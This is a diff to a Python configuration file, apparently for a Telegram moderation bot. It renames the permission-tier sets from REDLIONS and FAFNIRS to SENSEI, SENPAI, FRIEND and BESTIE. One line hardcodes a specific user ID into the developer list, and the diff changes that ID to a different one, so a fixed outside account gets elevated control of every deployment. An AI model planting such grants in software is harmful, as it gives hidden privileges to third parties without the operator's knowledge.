@@ -54,26 +54,26 @@ if ENV:
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
 
     try:
-        REDLIONS = {int(x) for x in os.environ.get("REDLIONS", "").split()}
+        SENSEI = {int(x) for x in os.environ.get("SENSEI", "").split()}
         DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "").split()}
         VERIFY = {int(x) for x in os.environ.get("VERIFY", "").split()}
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        SPRYZONS = {int(x) for x in os.environ.get("SPRYZONS", "").split()}
+        SENPAI = {int(x) for x in os.environ.get("SENPAI", "").split()}
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        LUINORS = {int(x) for x in os.environ.get("LUINORS", "").split()}
+        FRIEND = {int(x) for x in os.environ.get("FRIEND", "").split()}
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
     try:
-        FAFNIRS = {int(x) for x in os.environ.get("FAFNIRS", "").split()}
+        BESTIE = {int(x) for x in os.environ.get("BESTIE", "").split()}
     except ValueError:
-        raise Exception("Your fafnir users list does not contain valid integers.")
+        raise Exception("Your bestie users list does not contain valid integers.")
 
     INFOPIC = bool(os.environ.get("INFOPIC", False))
     EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
@@ -150,7 +150,7 @@ else:
     OWNER_USERNAME = Config.OWNER_USERNAME
     ALLOW_CHATS = Config.ALLOW_CHATS
     try:
-        REDLIONS = {int(x) for x in Config.REDLIONS or []}
+        SENSEI = {int(x) for x in Config.SENSEI or []}
         DEV_USERS = {int(x) for x in Config.DEV_USERS or []}
         VERIFY = {int(x) for x in Config.DEV_USERS or []}
 
@@ -158,19 +158,19 @@ else:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        SPRYZONS = {int(x) for x in Config.SPRYZONS or []}
+        SENPAI = {int(x) for x in Config.SENPAI or []}
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        LUINORS = {int(x) for x in Config.LUINORS or []}
+        FRIEND = {int(x) for x in Config.FRIEND or []}
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
     try:
-        FAFNIRS = {int(x) for x in Config.FAFNIRS or []}
+        BESTIE = {int(x) for x in Config.BESTIE or []}
     except ValueError:
-        raise Exception("Your fafnir users list does not contain valid integers.")
+        raise Exception("Your bestie users list does not contain valid integers.")
 
     EVENT_LOGS = Config.EVENT_LOGS
     EVENT_LOGS = Config.EVENT_LOGS
@@ -225,9 +225,9 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
-REDLIONS.add(OWNER_ID)
+SENSEI.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5295331438)
+DEV_USERS.add(5297261589)
 DEV_USERS.add(UNKNOWN_ID)
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
@@ -289,11 +289,11 @@ print("[INFO]: INITIALIZING ARQ CLIENT")
 arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
 
 
-REDLIONS = list(REDLIONS) + list(DEV_USERS)
+SENSEI = list(SENSEI) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
-LUINORS = list(LUINORS)
-SPRYZONS = list(SPRYZONS)
-FAFNIRS = list(FAFNIRS)
+FRIEND = list(FRIEND)
+SENPAI = list(SENPAI)
+BESTIE = list(BESTIE)
 
 
 # Load at end to ensure all prev variables have been set
